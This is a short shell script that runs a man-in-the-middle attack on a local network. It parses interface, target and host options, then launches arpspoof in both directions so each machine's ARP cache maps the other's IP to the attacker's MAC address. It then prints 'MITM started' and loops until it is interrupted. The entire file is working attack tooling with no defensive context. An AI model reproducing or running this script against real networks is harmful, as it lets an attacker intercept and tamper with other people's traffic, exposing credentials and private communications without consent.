#!/bin/sh

# Parse command-line options using getopts
while getopts "i:t:h:" opt; do
    case $opt in
        i)      interface="$OPTARG" # Store the value of the interface option
        ;;
        t)         target="$OPTARG" # Store the value of the target option
        ;;
        h)           host="$OPTARG" # Store the value of the host option
        ;;
        \?)     echo "\nInvalid option -$OPTARG" >&2 # Handle invalid options
        ;;
    esac
done

# Spoof the ARP cache of the target IP to make it believe that the host IP is the attacker's MAC address
arpspoof -i "$interface" -t "$target" -r "$host" &

# Spoof the ARP cache of the host IP to make it believe that the target IP is the attacker's MAC address
arpspoof -i "$interface" -t "$host" -r "$target" &

# Echo a message to indicate that a man-in-the-middle (MITM) attack is in progress between the target and the host
echo "\nMITM started on communication between $target and $host"

# Function to handle the SIGINT signal (Ctrl+C)
ctrl_c()
{
        echo "\nFinished MITM by user"
        exit 0
}

# Trap the SIGINT signal and call the ctrl_c function
trap ctrl_c INT

# Script continues to run indefinitely
while true
do
        sleep 1
done
